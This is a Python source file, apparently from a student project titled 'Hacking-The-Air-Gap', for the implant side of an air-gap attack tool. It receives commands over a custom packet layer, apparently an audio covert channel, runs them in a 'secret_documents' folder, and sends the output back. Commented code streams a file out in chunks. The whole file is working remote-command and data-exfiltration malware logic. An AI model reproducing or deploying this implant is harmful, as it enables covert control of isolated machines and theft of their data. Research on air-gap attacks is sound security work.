import PacketLayer
import subprocess
import time

command = str() 

def receive_command(cmd):
	global command 
	command = cmd
	print("Command received: " + cmd)
	# data = subprocess.check_output(cmd)
	# packet_layer.send_packet(data)
	# print("Packet sent")

if __name__ == "__main__":
	packet_layer = PacketLayer.PacketLayer(receive_command)

	while True:
	# 	pass
		if (command != ""):
			# TODO: Sleeping for three seconds to wait for tone from bridge to finish being sent
			time.sleep(3)
			print("Command received: " + command)
			data = subprocess.check_output(command, cwd=r"C:\Users\Danny\Documents\Winter20\eecs159b\Hacking-The-Air-Gap\MalwAIR-Python\secret_documents")
			print(data)
			packet_layer.send_packet(data)
			print("Packet sent")
			command = str()



	# with open("../MalwAIR/input/hello.txt", "rb") as f:
	# 	data = f.read(255)
	# 	while data:
	# 		packet_layer.send_packet(data)
	# 		print("Packet sent")
	# 		data = f.read(255)


	# for i in range(10):
	# 	audio_hack.send_byte(bytes('a', 'ascii'))
	# 			byte_int = int.from_bytes(byte, byteorder='big')